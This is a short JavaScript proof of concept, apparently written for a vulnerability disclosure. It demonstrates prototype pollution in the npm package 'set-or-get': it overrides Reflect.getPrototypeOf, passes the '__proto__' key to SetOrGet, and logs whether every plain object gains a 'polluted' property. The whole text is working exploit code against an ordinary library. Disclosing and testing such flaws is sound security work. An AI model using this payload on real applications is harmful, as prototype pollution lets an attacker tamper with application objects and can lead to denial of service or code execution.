Reflect.getPrototypeOf = () => false;
var SetOrGet = require('set-or-get');
obj = {};
console.log({}.polluted);
SetOrGet(obj, '__proto__', {}).polluted = 'yes';
console.log({}.polluted);